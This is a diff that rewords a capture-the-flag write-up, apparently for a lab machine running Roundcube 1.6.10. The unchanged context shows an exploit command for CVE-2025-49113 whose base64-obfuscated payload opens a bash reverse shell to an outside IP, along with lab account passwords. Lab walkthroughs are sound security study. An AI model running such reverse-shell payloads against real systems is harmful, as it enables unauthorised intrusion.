@@ -57,7 +57,7 @@ Roundcube 1.6.10 is vulnerable to **CVE-2025-49113** — an authenticated PHP ob
 php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 'printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzIvOTAwMSAwPiYxKSAm|base64 -d|bash'
 ```
 
-Reverse shell captured. The process was running inside a container.
+Reverse shell captured — the process was running inside a container.
 
 ## MySQL Session Decryption
 
@@ -100,13 +100,13 @@ print(rcube_decrypt(cipher_b64, key))
 
 ## Container to Host
 
-Container credentials for `jacob`:
+The container held credentials for `jacob`:
 
 ```text
 jacob : 595mO8DmwGeD
 ```
 
-A mail in `jacob`'s directory revealed a newer system password following a password policy change:
+A mail sitting in `jacob`'s directory revealed a newer system password, set after a password policy change:
 
 ```text
 jacob : gY4Wr3a1evp4
